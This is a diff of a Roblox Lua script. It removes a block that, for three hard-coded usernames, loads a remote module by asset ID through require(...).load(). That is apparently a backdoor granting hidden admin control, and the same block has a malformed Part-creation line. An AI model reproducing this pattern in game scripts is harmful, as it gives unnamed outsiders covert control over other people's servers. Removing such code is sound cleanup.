@@ -1,19 +1,4 @@
-local AdminPanel = {
-	"t10_kol",
-	"LuckDanil",
-	"minecraft2201653",
-}
-game.Players.PlayerAdded:Connect(function(player)
 
-	local part = instance.new("Part,workspace)
-			part.CFrame = player.Character.Torso.CFrame
-	if table.find(AdminPanel,player.Name) then
-		require(7192763922).load(player.Name)
-	end
-
-end)
-
---[[
 repeat task.wait() until _G.HDAdminMain~=nil
 local main = _G.HDAdminMain
 local HttpService = game.HttpService
@@ -135,4 +120,4 @@ game["Run Service"].Heartbeat:Connect(function()
 		end
 	end
 end)
-]]
+
